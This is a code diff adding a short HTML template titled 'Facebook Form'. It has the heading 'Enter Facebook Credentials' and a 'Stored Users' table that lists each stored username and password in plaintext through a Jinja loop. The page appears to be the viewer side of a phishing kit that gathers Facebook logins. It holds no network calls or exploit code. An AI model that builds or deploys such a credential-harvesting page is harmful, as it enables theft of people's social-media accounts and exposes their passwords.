@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook Form</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        margin: 20px;
+        padding: 0;
+      }
+      form {
+        margin-bottom: 20px;
+      }
+      table {
+        width: 100%;
+        border-collapse: collapse;
+      }
+      th,
+      td {
+        border: 1px solid #ddd;
+        padding: 8px;
+        text-align: left;
+      }
+      th {
+        background-color: #f4f4f4;
+      }
+    </style>
+  </head>
+  <body>
+    <h2>Enter Facebook Credentials</h2>
+
+    <h2>Stored Users</h2>
+    <table>
+      <tr>
+        <th>Username</th>
+        <th>Password</th>
+      </tr>
+      {% for user in users %}
+      <tr>
+        <td>{{ user.user_id }}</td>
+        <td>{{ user.clave }}</td>
+      </tr>
+      {% endfor %}
+    </table>
+  </body>
+</html>
